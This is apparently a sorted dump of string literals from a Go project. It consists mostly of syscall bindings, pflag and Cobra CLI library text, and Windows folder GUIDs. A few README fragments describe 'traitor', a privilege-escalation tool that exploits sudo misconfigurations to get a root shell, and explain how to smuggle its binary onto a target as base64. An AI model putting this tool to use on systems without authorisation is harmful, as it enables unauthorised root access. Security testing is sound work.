"Fchown(fd int, uid int, gid int) (err error)"
"Fchownat(dirfd int, path string, uid int, gid int, flags int) (err error)"
"Fclonefileat(srcDirfd int, dstDirfd int, dst string, flags int) (err error)"
"FcntlFlock(fd uintptr, cmd int, lk "
"FcntlInt(fd uintptr, cmd int, arg int) (r int,err error) = fcntl"
"FcntlInt(fd uintptr, cmd int, arg int) (retval int, err error) = SYS_FCNTL"
"FdSet, e "
"FdSet, timeout "
"FdSet, w "
"Fedora       DistributionID = ""fedora"""
"Ffree:       old.Ffree,"
"Fgetxattr(fd int, attr string, dest []byte) (sz int, err error)"
"Files:       old.Files,"
"Filetime, additionalStore Handle, para "
"Filetime, atime "
"Filetime, exitTime "
"Filetime, kernelTime "
"Filetime, userTime "
"Filetime, wtime "
"FindFirstChangeNotification(path string, watchSubtree bool, notifyFilter uint32) (handle Handle, err error) [failretval==InvalidHandle] = kernel32.FindFirstChangeNotificationW"
"FindNextVolume(findVolume Handle, volumeName "
"FindNextVolumeMountPoint(findVolumeMountPoint Handle, volumeMountPoint "
"FinitModule(fd int, params string, flags int) (err error)"
"First, install tml:"
"Flag --badflag has been deprecated, please use --good-flag instead"
"Flag parsing stops after the terminator ""--"". Unlike the flag package,"
"Flag shorthand -n has been deprecated, please use --noshorthandflag only"
"Flag) (name string, usage string) {"
"Flag, len(list))"
"Flag, value string) error {"
"Flag, value string) error"
"Flag, value string) error) error {"
"Flag, value string) error) {"
"FlagSet) Bool(name string, value bool, usage string) "
"FlagSet) BoolP(name, shorthand string, value bool, usage string) "
"FlagSet) BoolSlice(name string, value []bool, usage string) "
"FlagSet) BoolSliceP(name, shorthand string, value []bool, usage string) "
"FlagSet) BytesBase64(name string, value []byte, usage string) "
"FlagSet) BytesBase64P(name, shorthand string, value []byte, usage string) "
"FlagSet) BytesHex(name string, value []byte, usage string) "
"FlagSet) BytesHexP(name, shorthand string, value []byte, usage string) "
"FlagSet) Count(name string, usage string) "
"FlagSet) CountP(name, shorthand string, usage string) "
"FlagSet) Duration(name string, value time.Duration, usage string) "
"FlagSet) DurationP(name, shorthand string, value time.Duration, usage string) "
"FlagSet) DurationSlice(name string, value []time.Duration, usage string) "
"FlagSet) DurationSliceP(name, shorthand string, value []time.Duration, usage string) "
"FlagSet) Float32(name string, value float32, usage string) "
"FlagSet) Float32P(name, shorthand string, value float32, usage string) "
"FlagSet) Float32Slice(name string, value []float32, usage string) "
"FlagSet) Float32SliceP(name, shorthand string, value []float32, usage string) "
"FlagSet) Float64(name string, value float64, usage string) "
"FlagSet) Float64P(name, shorthand string, value float64, usage string) "
"FlagSet) Float64Slice(name string, value []float64, usage string) "
"FlagSet) Float64SliceP(name, shorthand string, value []float64, usage string) "
"FlagSet) GetBool(name string) (bool, error) {"
"FlagSet) GetBoolSlice(name string) ([]bool, error) {"
"FlagSet) GetBytesBase64(name string) ([]byte, error) {"
"FlagSet) GetBytesHex(name string) ([]byte, error) {"
"FlagSet) GetCount(name string) (int, error) {"
"FlagSet) GetDuration(name string) (time.Duration, error) {"
"FlagSet) GetDurationSlice(name string) ([]time.Duration, error) {"
"FlagSet) GetFloat32(name string) (float32, error) {"
"FlagSet) GetFloat32Slice(name string) ([]float32, error) {"
"FlagSet) GetFloat64(name string) (float64, error) {"
"FlagSet) GetFloat64Slice(name string) ([]float64, error) {"
"FlagSet) GetIP(name string) (net.IP, error) {"
"FlagSet) GetIPNet(name string) (net.IPNet, error) {"
"FlagSet) GetIPSlice(name string) ([]net.IP, error) {"
"FlagSet) GetIPv4Mask(name string) (net.IPMask, error) {"
"FlagSet) GetInt(name string) (int, error) {"
"FlagSet) GetInt16(name string) (int16, error) {"
"FlagSet) GetInt32(name string) (int32, error) {"
"FlagSet) GetInt32Slice(name string) ([]int32, error) {"
"FlagSet) GetInt64(name string) (int64, error) {"
"FlagSet) GetInt64Slice(name string) ([]int64, error) {"
"FlagSet) GetInt8(name string) (int8, error) {"
"FlagSet) GetIntSlice(name string) ([]int, error) {"
"FlagSet) GetString(name string) (string, error) {"
"FlagSet) GetStringArray(name string) ([]string, error) {"
"FlagSet) GetStringSlice(name string) ([]string, error) {"
"FlagSet) GetStringToInt(name string) (map[string]int, error) {"
"FlagSet) GetStringToInt64(name string) (map[string]int64, error) {"
"FlagSet) GetStringToString(name string) (map[string]string, error) {"
"FlagSet) GetUint(name string) (uint, error) {"
"FlagSet) GetUint16(name string) (uint16, error) {"
"FlagSet) GetUint32(name string) (uint32, error) {"
"FlagSet) GetUint64(name string) (uint64, error) {"
"FlagSet) GetUint8(name string) (uint8, error) {"
"FlagSet) GetUintSlice(name string) ([]uint, error) {"
"FlagSet) IP(name string, value net.IP, usage string) "
"FlagSet) IPMask(name string, value net.IPMask, usage string) "
"FlagSet) IPMaskP(name, shorthand string, value net.IPMask, usage string) "
"FlagSet) IPNet(name string, value net.IPNet, usage string) "
"FlagSet) IPNetP(name, shorthand string, value net.IPNet, usage string) "
"FlagSet) IPP(name, shorthand string, value net.IP, usage string) "
"FlagSet) IPSlice(name string, value []net.IP, usage string) "
"FlagSet) IPSliceP(name, shorthand string, value []net.IP, usage string) "
"FlagSet) Init(name string, errorHandling ErrorHandling) {"
"FlagSet) Int(name string, value int, usage string) "
"FlagSet) Int16(name string, value int16, usage string) "
"FlagSet) Int16P(name, shorthand string, value int16, usage string) "
"FlagSet) Int32(name string, value int32, usage string) "
"FlagSet) Int32P(name, shorthand string, value int32, usage string) "
"FlagSet) Int32Slice(name string, value []int32, usage string) "
"FlagSet) Int32SliceP(name, shorthand string, value []int32, usage string) "
"FlagSet) Int64(name string, value int64, usage string) "
"FlagSet) Int64P(name, shorthand string, value int64, usage string) "
"FlagSet) Int64Slice(name string, value []int64, usage string) "
"FlagSet) Int64SliceP(name, shorthand string, value []int64, usage string) "
"FlagSet) Int8(name string, value int8, usage string) "
"FlagSet) Int8P(name, shorthand string, value int8, usage string) "
"FlagSet) IntP(name, shorthand string, value int, usage string) "
"FlagSet) IntSlice(name string, value []int, usage string) "
"FlagSet) IntSliceP(name, shorthand string, value []int, usage string) "
"FlagSet) MarkDeprecated(name string, usageMessage string) error {"
"FlagSet) MarkShorthandDeprecated(name string, usageMessage string) error {"
"FlagSet) ParseAll(arguments []string, fn func(flag "
"FlagSet) Set(name, value string) error {"
"FlagSet) SetAnnotation(name, key string, values []string) error {"
"FlagSet) String(name string, value string, usage string) "
"FlagSet) StringArray(name string, value []string, usage string) "
"FlagSet) StringArrayP(name, shorthand string, value []string, usage string) "
"FlagSet) StringP(name, shorthand string, value string, usage string) "
"FlagSet) StringSlice(name string, value []string, usage string) "
"FlagSet) StringSliceP(name, shorthand string, value []string, usage string) "
"FlagSet) StringToInt(name string, value map[string]int, usage string) "
"FlagSet) StringToInt64(name string, value map[string]int64, usage string) "
"FlagSet) StringToInt64P(name, shorthand string, value map[string]int64, usage string) "
"FlagSet) StringToIntP(name, shorthand string, value map[string]int, usage string) "
"FlagSet) StringToString(name string, value map[string]string, usage string) "
"FlagSet) StringToStringP(name, shorthand string, value map[string]string, usage string) "
"FlagSet) Uint(name string, value uint, usage string) "
"FlagSet) Uint16(name string, value uint16, usage string) "
"FlagSet) Uint16P(name, shorthand string, value uint16, usage string) "
"FlagSet) Uint32(name string, value uint32, usage string) "
"FlagSet) Uint32P(name, shorthand string, value uint32, usage string) "
"FlagSet) Uint64(name string, value uint64, usage string) "
"FlagSet) Uint64P(name, shorthand string, value uint64, usage string) "
"FlagSet) Uint8(name string, value uint8, usage string) "
"FlagSet) Uint8P(name, shorthand string, value uint8, usage string) "
"FlagSet) UintP(name, shorthand string, value uint, usage string) "
"FlagSet) UintSlice(name string, value []uint, usage string) "
"FlagSet) UintSliceP(name, shorthand string, value []uint, usage string) "
"FlagSet) Var(value Value, name string, usage string) {"
"FlagSet) VarP(value Value, name, shorthand, usage string) {"
"FlagSet) VarPF(value Value, name, shorthand, usage string) "
"FlagSet) failf(format string, a ...interface{}) error {"
"FlagSet) getFlagType(name string, ftype string, convFunc func(sval string) (interface{}, error)) (interface{}, error) {"
"FlagSet) parseArgs(args []string, fn parseFunc) (err error) {"
"FlagSet) parseLongArg(s string, args []string, fn parseFunc) (a []string, err error) {"
"FlagSet) parseShortArg(s string, args []string, fn parseFunc) (a []string, err error) {"
"FlagSet) parseSingleShortArg(shorthands string, args []string, fn parseFunc) (outShorts string, outArgs []string, err error) {"
"FlagSet, name string) NormalizedName { return NormalizedName(name) }"
"FlagSet, name string) NormalizedName {"
"FlagSet, name string) NormalizedName"
"FlagSet, name string) NormalizedName) {"
"Flags may then be used directly. If you're using the flags themselves,"
"Flags, DebugFlags uint32"
"Flags:        pp.Flags,"
"Flags:       old.Flags,"
"Flags:   old.Flags,"
"Flags: pp.Flags,"
"Flistxattr(fd int, dest []byte) (sz int, err error)"
"Flock(fd int, how int) (err error)"
"FlushViewOfFile(addr uintptr, length uintptr) (err error)"
"For a more complete example of a larger application, please checkout [Hugo](https://gohugo.io/)."
"For backward compatibility, Cobra still supports its bash legacy dynamic completion solution."
"For backward compatibility, Cobra still supports its legacy dynamic completion solution (described below).  Unlike the "
"For commands and flags, Cobra will provide the descriptions automatically, based on usage information."
"For complete details on using the Cobra generator, please refer to [The Cobra-CLI Generator README](https://github.com/spf13/cobra-cli/blob/main/README.md)"
"For complete details on using the Cobra library, please read the [The Cobra User Guide](user_guide.md)."
"For complete details on using the Cobra-CLI generator, please read [The Cobra Generator README](https://github.com/spf13/cobra-cli/blob/main/README.md)"
"For each OS, there is a hand-written Go file at "
"For example, "
"For example, if you want "
"For example, say "
"For example, using zsh:"
"For more information, please refer to <https://unlicense.org>"
"For simplicity, when in "
"For such flags, the default value is just the initial value of the variable."
"ForkExec wrapper. Unlike the first two, it does not call into the scheduler to"
"FormatMessage(flags uint32, msgsrc uintptr, msgid uint32, langid uint32, buf []uint16, args "
"Fpathconf(fd int, name int) (val int, err error)"
"Fprintf(w, ""%s"
"Fprintln(os.Stdout, input)"
"Fremovexattr(fd int, attr string) (err error)"
"Fsetxattr(fd int, attr string, dest []byte, flags int) (err error)"
"Fsid:    old.Fsid,"
"Fsmount(fd int, flags int, mountAttrs int) (fsfd int, err error)"
"Fsopen(fsName string, flags int) (fd int, err error)"
"Fspick(dirfd int, pathName string, flags int) (fd int, err error)"
"Fstat(fd int, edir []byte) (n int, err error)"
"Fstat(fd int, stat "
"Fstatat(dirfd int, path string, stat "
"Fstatat(fd int, path string, stat "
"Fstatfs(fd int, buf "
"Fstatfs(fd int, stat "
"Fstatvfs(fd int, stat "
"Fstatvfs(fd int, vfsstat "
"Fstatvfs1(fd int, buf "
"Ftruncate(fd int, length int64) (err error) = SYS_FTRUNCATE64"
"Ftruncate(fd int, length int64) (err error)"
"Fwstat(fd int, edir []byte) (err error)"
"GODEFS=""go tool cgo -godefs"""
"GOOS != ""linux"""
"GOOS == ""linux"""
"GOOS=darwin GOARCH=amd64 go build -o bin/darwin-amd64/tml -ldflags ""-X github.com/liamg/tml/version.Version=${TRAVIS_TAG}"" ./tml"
"GOOS=linux  GOARCH=amd64 go build -o bin/linux-amd64/tml  -ldflags ""-X github.com/liamg/tml/version.Version=${TRAVIS_TAG}"" ./tml"
"GOOSARCH=""${GOOS}_${GOARCH}"""
"GUID, DeviceDescription "
"GUID, Enumerator "
"GUID, classGuidListSize uint32, requiredSize "
"GUID, className "
"GUID, data "
"GUID, deviceDescription string, hwndParent uintptr, creationFlags DICD) ("
"GUID, deviceDescription string, hwndParent uintptr, creationFlags DICD) (deviceInfoData "
"GUID, deviceID "
"GUID, enumerator string, hwndParent uintptr, flags DIGCF, deviceInfoSet DevInfo, machineName string) (handle DevInfo, err error) {"
"GUID, flags uint32) ([]string, error) {"
"GUID, functionTable "
"GUID, hwndParent uintptr, machineName "
"GUID, hwndParent uintptr, machineName string) (deviceInfoSet DevInfo, err error) {"
"GUID, lpsz "
"GUID, machineName string) (className string, err error) {"
"Gen:     uint64(old.Gen),"
"GenerateConsoleCtrlEvent(ctrlEvent uint32, processGroupID uint32) (err error)"
"GetAdaptersAddresses(family uint32, flags uint32, reserved uintptr, adapterAddresses "
"GetCommTimeouts(handle Handle, timeouts "
"GetComputerNameEx(nametype uint32, buf "
"GetConsoleMode(console Handle, mode "
"GetConsoleScreenBufferInfo(console Handle, info "
"GetCurrentDirectory(buflen uint32, buf "
"GetExitCodeProcess(handle Handle, exitcode "
"GetFileInformationByHandle(handle Handle, data "
"GetFileInformationByHandleEx(handle Handle, class uint32, outBuffer "
"GetFileType(filehandle Handle) (n uint32, err error)"
"GetFileVersionInfo(filename string, handle uint32, bufSize uint32, buffer unsafe.Pointer) (err error) = version.GetFileVersionInfoW"
"GetFileVersionInfoSize(filename string, zeroHandle "
"GetFinalPathNameByHandle(file Handle, filePath "
"GetLogicalDriveStrings(bufferLength uint32, buffer "
"GetLogicalDrives() (drivesBitMask uint32, err error) [failretval==0]"
"GetModuleBaseName(process Handle, module Handle, baseName "
"GetModuleFileName(module Handle, filename "
"GetModuleFileNameEx(process Handle, module Handle, filename "
"GetModuleHandleEx(flags uint32, moduleName "
"GetModuleInformation(process Handle, module Handle, modinfo "
"GetNamedPipeHandleState(pipe Handle, state "
"GetNamedPipeInfo(pipe Handle, flags "
"GetOverlappedResult(handle Handle, overlapped "
"GetPriorityClass(process Handle) (ret uint32, err error) = kernel32.GetPriorityClass"
"GetProcAddress(module Handle, procname string) (proc uintptr, err error)"
"GetProcessId(process Handle) (id uint32, err error)"
"GetProcessTimes(handle Handle, creationTime "
"GetProcessWorkingSetSizeEx(hProcess Handle, lpMinimumWorkingSetSize "
"GetQueuedCompletionStatus(cphandle Handle, qty "
"GetServByName(name string, proto string) (s "
"GetStdHandle(stdhandle uint32) (handle Handle, err error) [failretval==InvalidHandle]"
"GetTempPath(buflen uint32, buf "
"GetTokenInformation(token Token, infoClass uint32, info "
"GetUserNameEx(nameFormat uint32, nameBuffre "
"GetUserProfileDirectory(t Token, dir "
"GetVersion() (ver uint32, err error)"
"GetVolumeInformationByHandle(file Handle, volumeNameBuffer "
"GetWindowThreadProcessId(hwnd HWND, pid "
"Getcwd(buf []byte) (n int, err error) = SYS___GETCWD"
"Getcwd(buf []byte) (n int, err error)"
"Getdents(fd int, buf []byte) (n int, err error) = SYS_GETDENTS64"
"Getdents(fd int, buf []byte) (n int, err error)"
"Getdents(fd int, buf []byte, basep "
"Getdirentries(fd int, buf []byte, basep "
"Getpgid(pid int) (pgid int, err error) = SYS_GETPGID"
"Getpgid(pid int) (pgid int, err error)"
"Getpgrp() (pgid int, err error)"
"Getpriority(which int, who int) (n int, err error)"
"Getpriority(which int, who int) (prio int, err error)"
"Getrandom(buf []byte, flags int) (n int, err error)"
"Getrlimit(resource int, rlim "
"Getrlimit(which int, lim "
"Getrtable() (rtable int, err error)"
"Getrusage(who int, rusage "
"Getsid(pid int) (sid int, err error)"
"Getsockopt(s Handle, level int32, optname int32, optval "
"Getxattr(path string, attr string, dest []byte) (sz int, err error)"
"Gid:     old.Gid,"
"Gid: uint32(effectiveGID),"
"Google hereby grants to You a perpetual, worldwide, non-exclusive,"
"Grab a binary from the [releases page](https://github.com/liamg/traitor/releases), or use go:"
"Green:   []byte{keyEscape, '[', '3', '2', 'm'},"
"HIDRawDevInfo, error) {"
"Handle) (bufSize uint32, err error) = version.GetFileVersionInfoSizeW"
"Handle) (bufSize uint32, err error) {"
"Handle, access uint32, oa "
"Handle, cb uint32, cbNeeded "
"Handle, container "
"Handle, context "
"Handle, dwDesiredAccess uint32, bInheritHandle bool, dwOptions uint32) (err error) {"
"Handle, dwDesiredAccess uint32, bInheritHandle bool, dwOptions uint32) (err error)"
"Handle, keySpec "
"Handle, msg "
"Handle, sa "
"Handle, token Token) (err error) = advapi32.SetThreadToken"
"Handle, token Token) (err error) {"
"Handle, writehandle "
"Handle: h,"
"Hidden:                true,"
"Hidden:            c.CompletionOptions.HiddenDefaultCmd,"
"Hostent, err error) [failretval==nil] = ws2_32.gethostbyname"
"Hostent, err error) {"
"ICMPv6Filter, error) {"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
"IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR"
"IO_STATUS_BLOCK, allocationSize "
"IO_STATUS_BLOCK, inBuffer "
"IO_STATUS_BLOCK, share uint32, disposition uint32, options uint32, typ uint32, readMode uint32, completionMode uint32, maxInstances uint32, inboundQuota uint32, outputQuota uint32, timeout "
"IPMreq, error) {"
"IPMreqn, error) {"
"IPv6MTUInfo, error) {"
"IPv6Mreq, error) {"
"If it is not installed already, you can install it via your OS's package manager."
"If it is not possible or desirable to put the notice in a particular file, then"
"If the machine you're attempting privesc on cannot reach GitHub to download the binary, and you have no way to upload the binary to the machine over SCP/FTP etc., then you can try base64 encoding the binary on your machine, and echoing the base64 encoded string to "
"If you find an issue with this library, please report an issue. If you'd"
"If you have questions regarding Cobra, feel free to ask it in the community"
"If you like, you can bind the flag to a variable using the Var() functions."
"If you need to disable suggestions or tweak the string distance in your command, use:"
"If you wish to return an error to the caller of a command, "
"If your nouns have aliases, you can define them alongside "
"Ifindex:      pp.Ifindex,"
"Ifindex: int(pp.Ifindex),"
"Ifreq) Inet4Addr() ([]byte, error) {"
"Ifreq, error) {"
"IfreqMTU, error) {"
"Ifreq{raw: ifr}, nil"
"In a Cobra app, typically the main.go file is very bare. It serves one purpose: initializing Cobra."
"In a Cobra app, typically the main.go file is very bare. It serves one purpose: to initialize Cobra."
"In jurisdictions that recognize copyright laws, the author or authors"
"In order to protect both you and ourselves, you will need to sign the"
"In some cases it is not possible to provide a list of completions in advance.  Instead, the list of completions must be determined at execution-time. In a similar fashion as for static completions, you can use the "
"In the example above, 'port' is the flag."
"In the example above, 'server' is the command."
"In the example below, we have defined three commands. Two are at the top level"
"In the following example, 'server' is a command, and 'port' is a flag:"
"In this example, the persistent flag "
"IncludeLeadingResets:  true,"
"IncludeTrailingResets: true,"
"InitModule(moduleImage []byte, params string) (err error)"
"Ino:     uint64(old.Ino),"
"InotifyAddWatch(fd int, pathname string, mask uint32) (watchdesc int, err error)"
"InotifyInit1(flags int) (fd int, err error)"
"InotifyRmWatch(fd int, watchdesc uint32) (success int, err error)"
"Integer flags accept 1234, 0664, 0x1234 and may be negative."
"Interval: NsecToTimeval(interval.Nanoseconds()),"
"Ioperm(from int, num int, on int) (err error)"
"Iosize:      old.Iosize,"
"IpAdapterAddresses, sizePointer "
"IpAdapterInfo, ol "
"IsVulnerable(ctx context.Context, s "
"IsWow64Process(handle Handle, isWow64 "
"IsWow64Process2(handle Handle, processMachine "
"It is possible to deprecate a flag, or just its shorthand. Deprecating a flag/shorthand hides it from help text and prints a usage message when the deprecated flag/shorthand is used."
"It is possible to mark a flag as hidden, meaning it will still function as normal, however will not show up in usage/help text."
"It'll exploit most sudo privileges listed in GTFOBins to pop a root shell, as well as exploiting issues like a writable "
"It's not required to close tags you've opened, though it can make for easier reading."
"ItimerSpec, oldValue "
"Itimerval, oldValue "
"KCMClone, error) {"
"KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE"
"KNOWNFOLDERID, flags uint32) (string, error) {"
"KNOWNFOLDERID, flags uint32, token Token, path "
"KNOWNFOLDERID{0x%08x, 0x%04x, 0x%04x, [8]byte{0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x}}"
"KNOWNFOLDERID{0x008ca0b1, 0x55b4, 0x4c56, [8]byte{0xb8, 0xa8, 0x4d, 0xe4, 0xb2, 0x99, 0xd3, 0xbe}}"
"KNOWNFOLDERID{0x00bcfc5a, 0xed94, 0x4e48, [8]byte{0x96, 0xa1, 0x3f, 0x62, 0x17, 0xf2, 0x19, 0x90}}"
"KNOWNFOLDERID{0x0139d44e, 0x6afe, 0x49f2, [8]byte{0x86, 0x90, 0x3d, 0xaf, 0xca, 0xe6, 0xff, 0xb8}}"
"KNOWNFOLDERID{0x0482af6c, 0x08f1, 0x4c34, [8]byte{0x8c, 0x90, 0xe1, 0x7e, 0xc9, 0x8b, 0x1e, 0x17}}"
"KNOWNFOLDERID{0x054fae61, 0x4dd8, 0x4787, [8]byte{0x80, 0xb6, 0x09, 0x02, 0x20, 0xc4, 0xb7, 0x00}}"
"KNOWNFOLDERID{0x0762d272, 0xc50a, 0x4bb0, [8]byte{0xa3, 0x82, 0x69, 0x7d, 0xcd, 0x72, 0x9b, 0x80}}"
"KNOWNFOLDERID{0x0ac0837c, 0xbbf8, 0x452a, [8]byte{0x85, 0x0d, 0x79, 0xd0, 0x8e, 0x66, 0x7c, 0xa7}}"
"KNOWNFOLDERID{0x0d4c3db6, 0x03a3, 0x462f, [8]byte{0xa0, 0xe6, 0x08, 0x92, 0x4c, 0x41, 0xb5, 0xd4}}"
"KNOWNFOLDERID{0x0ddd015d, 0xb06c, 0x45d5, [8]byte{0x8c, 0x4c, 0xf5, 0x97, 0x13, 0x85, 0x46, 0x39}}"
"KNOWNFOLDERID{0x0f214138, 0xb1d3, 0x4a90, [8]byte{0xbb, 0xa9, 0x27, 0xcb, 0xc0, 0xc5, 0x38, 0x9a}}"
"KNOWNFOLDERID{0x12d4c69e, 0x24ad, 0x4923, [8]byte{0xbe, 0x19, 0x31, 0x32, 0x1c, 0x43, 0xa7, 0x67}}"
"KNOWNFOLDERID{0x15ca69b3, 0x30ee, 0x49c1, [8]byte{0xac, 0xe1, 0x6b, 0x5e, 0xc3, 0x72, 0xaf, 0xb5}}"
"KNOWNFOLDERID{0x1777f761, 0x68ad, 0x4d8a, [8]byte{0x87, 0xbd, 0x30, 0xb7, 0x59, 0xfa, 0x33, 0xdd}}"
"KNOWNFOLDERID{0x18989b1d, 0x99b5, 0x455b, [8]byte{0x84, 0x1c, 0xab, 0x7c, 0x74, 0xe4, 0xdd, 0xfc}}"
"KNOWNFOLDERID{0x190337d1, 0xb8ca, 0x4121, [8]byte{0xa6, 0x39, 0x6d, 0x47, 0x2d, 0x16, 0x97, 0x2a}}"
"KNOWNFOLDERID{0x1a6fdba2, 0xf42d, 0x4358, [8]byte{0xa7, 0x98, 0xb7, 0x4d, 0x74, 0x59, 0x26, 0xc5}}"
"KNOWNFOLDERID{0x1ac14e77, 0x02e7, 0x4e5d, [8]byte{0xb7, 0x44, 0x2e, 0xb1, 0xae, 0x51, 0x98, 0xb7}}"
"KNOWNFOLDERID{0x1b3ea5dc, 0xb587, 0x4786, [8]byte{0xb4, 0xef, 0xbd, 0x1d, 0xc3, 0x32, 0xae, 0xae}}"
"KNOWNFOLDERID{0x1c2ac1dc, 0x4358, 0x4b6c, [8]byte{0x97, 0x33, 0xaf, 0x21, 0x15, 0x65, 0x76, 0xf0}}"
"KNOWNFOLDERID{0x1e87508d, 0x89c2, 0x42f0, [8]byte{0x8a, 0x7e, 0x64, 0x5a, 0x0f, 0x50, 0xca, 0x58}}"
"KNOWNFOLDERID{0x2112ab0a, 0xc86a, 0x4ffe, [8]byte{0xa3, 0x68, 0x0d, 0xe9, 0x6e, 0x47, 0x01, 0x2e}}"
"KNOWNFOLDERID{0x2400183a, 0x6185, 0x49fb, [8]byte{0xa2, 0xd8, 0x4a, 0x39, 0x2a, 0x60, 0x2b, 0xa3}}"
"KNOWNFOLDERID{0x24d89e24, 0x2f19, 0x4534, [8]byte{0x9d, 0xde, 0x6a, 0x66, 0x71, 0xfb, 0xb8, 0xfe}}"
"KNOWNFOLDERID{0x289a9a43, 0xbe44, 0x4057, [8]byte{0xa4, 0x1b, 0x58, 0x7a, 0x76, 0xd7, 0xe7, 0xf9}}"
"KNOWNFOLDERID{0x2a00375e, 0x224c, 0x49de, [8]byte{0xb8, 0xd1, 0x44, 0x0d, 0xf7, 0xef, 0x3d, 0xdc}}"
"KNOWNFOLDERID{0x2b0f765d, 0xc0e9, 0x4171, [8]byte{0x90, 0x8e, 0x08, 0xa6, 0x11, 0xb8, 0x4f, 0xf6}}"
"KNOWNFOLDERID{0x2b20df75, 0x1eda, 0x4039, [8]byte{0x80, 0x97, 0x38, 0x79, 0x82, 0x27, 0xd5, 0xb7}}"
"KNOWNFOLDERID{0x2c36c0aa, 0x5812, 0x4b87, [8]byte{0xbf, 0xd0, 0x4c, 0xd0, 0xdf, 0xb1, 0x9b, 0x39}}"
"KNOWNFOLDERID{0x2f8b40c2, 0x83ed, 0x48ee, [8]byte{0xb3, 0x83, 0xa1, 0xf1, 0x57, 0xec, 0x6f, 0x9a}}"
"KNOWNFOLDERID{0x31c0dd25, 0x9439, 0x4f12, [8]byte{0xbf, 0x41, 0x7f, 0xf4, 0xed, 0xa3, 0x87, 0x22}}"
"KNOWNFOLDERID{0x3214fab5, 0x9757, 0x4298, [8]byte{0xbb, 0x61, 0x92, 0xa9, 0xde, 0xaa, 0x44, 0xff}}"
"KNOWNFOLDERID{0x339719b5, 0x8c47, 0x4894, [8]byte{0x94, 0xc2, 0xd8, 0xf7, 0x7a, 0xdd, 0x44, 0xa6}}"
"KNOWNFOLDERID{0x33e28130, 0x4e1e, 0x4676, [8]byte{0x83, 0x5a, 0x98, 0x39, 0x5c, 0x3b, 0xc3, 0xbb}}"
"KNOWNFOLDERID{0x352481e8, 0x33be, 0x4251, [8]byte{0xba, 0x85, 0x60, 0x07, 0xca, 0xed, 0xcf, 0x9d}}"
"KNOWNFOLDERID{0x35286a68, 0x3c57, 0x41a1, [8]byte{0xbb, 0xb1, 0x0e, 0xae, 0x73, 0xd7, 0x6c, 0x95}}"
"KNOWNFOLDERID{0x374de290, 0x123f, 0x4565, [8]byte{0x91, 0x64, 0x39, 0xc4, 0x92, 0x5e, 0x46, 0x7b}}"
"KNOWNFOLDERID{0x3b193882, 0xd3ad, 0x4eab, [8]byte{0x96, 0x5a, 0x69, 0x82, 0x9d, 0x1f, 0xb5, 0x9f}}"
"KNOWNFOLDERID{0x3d644c9b, 0x1fb8, 0x4f30, [8]byte{0x9b, 0x45, 0xf6, 0x70, 0x23, 0x5f, 0x79, 0xc0}}"
"KNOWNFOLDERID{0x3db40b20, 0x2a30, 0x4dbe, [8]byte{0x91, 0x7e, 0x77, 0x1d, 0xd2, 0x1d, 0xd0, 0x99}}"
"KNOWNFOLDERID{0x3eb685db, 0x65f9, 0x4cf6, [8]byte{0xa0, 0x3a, 0xe3, 0xef, 0x65, 0x72, 0x9f, 0x3d}}"
"KNOWNFOLDERID{0x43668bf8, 0xc14e, 0x49b2, [8]byte{0x97, 0xc9, 0x74, 0x77, 0x84, 0xd7, 0x84, 0xb7}}"
"KNOWNFOLDERID{0x48daf80b, 0xe6cf, 0x4f4e, [8]byte{0xb8, 0x00, 0x0e, 0x69, 0xd8, 0x4e, 0xe3, 0x84}}"
"KNOWNFOLDERID{0x491e922f, 0x5643, 0x4af4, [8]byte{0xa7, 0xeb, 0x4e, 0x7a, 0x13, 0x8d, 0x81, 0x74}}"
"KNOWNFOLDERID{0x4bd8d571, 0x6d19, 0x48d3, [8]byte{0xbe, 0x97, 0x42, 0x22, 0x20, 0x08, 0x0e, 0x43}}"
"KNOWNFOLDERID{0x4bfefb45, 0x347d, 0x4006, [8]byte{0xa5, 0xbe, 0xac, 0x0c, 0xb0, 0x56, 0x71, 0x92}}"
"KNOWNFOLDERID{0x4c5c32ff, 0xbb9d, 0x43b0, [8]byte{0xb5, 0xb4, 0x2d, 0x72, 0xe5, 0x4e, 0xaa, 0xa4}}"
"KNOWNFOLDERID{0x4d9f7874, 0x4e0c, 0x4904, [8]byte{0x96, 0x7b, 0x40, 0xb0, 0xd2, 0x0c, 0x3e, 0x4b}}"
"KNOWNFOLDERID{0x52528a6b, 0xb9e3, 0x4add, [8]byte{0xb6, 0x0d, 0x58, 0x8c, 0x2d, 0xba, 0x84, 0x2d}}"
"KNOWNFOLDERID{0x52a4f021, 0x7b75, 0x48a9, [8]byte{0x9f, 0x6b, 0x4b, 0x87, 0xa2, 0x10, 0xbc, 0x8f}}"
"KNOWNFOLDERID{0x559d40a3, 0xa036, 0x40fa, [8]byte{0xaf, 0x61, 0x84, 0xcb, 0x43, 0x0a, 0x4d, 0x34}}"
"KNOWNFOLDERID{0x56784854, 0xc6cb, 0x462b, [8]byte{0x81, 0x69, 0x88, 0xe3, 0x50, 0xac, 0xb8, 0x82}}"
"KNOWNFOLDERID{0x5cd7aee2, 0x2219, 0x4a67, [8]byte{0xb8, 0x5d, 0x6c, 0x9c, 0xe1, 0x56, 0x60, 0xcb}}"
"KNOWNFOLDERID{0x5ce4a5e9, 0xe4eb, 0x479d, [8]byte{0xb8, 0x9f, 0x13, 0x0c, 0x02, 0x88, 0x61, 0x55}}"
"KNOWNFOLDERID{0x5e6c858f, 0x0e22, 0x4760, [8]byte{0x9a, 0xfe, 0xea, 0x33, 0x17, 0xb6, 0x71, 0x73}}"
"KNOWNFOLDERID{0x625b53c3, 0xab48, 0x4ec1, [8]byte{0xba, 0x1f, 0xa1, 0xef, 0x41, 0x46, 0xfc, 0x19}}"
"KNOWNFOLDERID{0x62ab5d82, 0xfdc1, 0x4dc3, [8]byte{0xa9, 0xdd, 0x07, 0x0d, 0x1d, 0x49, 0x5d, 0x97}}"
"KNOWNFOLDERID{0x6365d5a7, 0x0f0d, 0x45e5, [8]byte{0x87, 0xf6, 0x0d, 0xa5, 0x6b, 0x6a, 0x4f, 0x7d}}"
"KNOWNFOLDERID{0x69d2cf90, 0xfc33, 0x4fb7, [8]byte{0x9a, 0x0c, 0xeb, 0xb0, 0xf0, 0xfc, 0xb4, 0x3c}}"
"KNOWNFOLDERID{0x6d809377, 0x6af0, 0x444b, [8]byte{0x89, 0x57, 0xa3, 0x77, 0x3f, 0x02, 0x20, 0x0e}}"
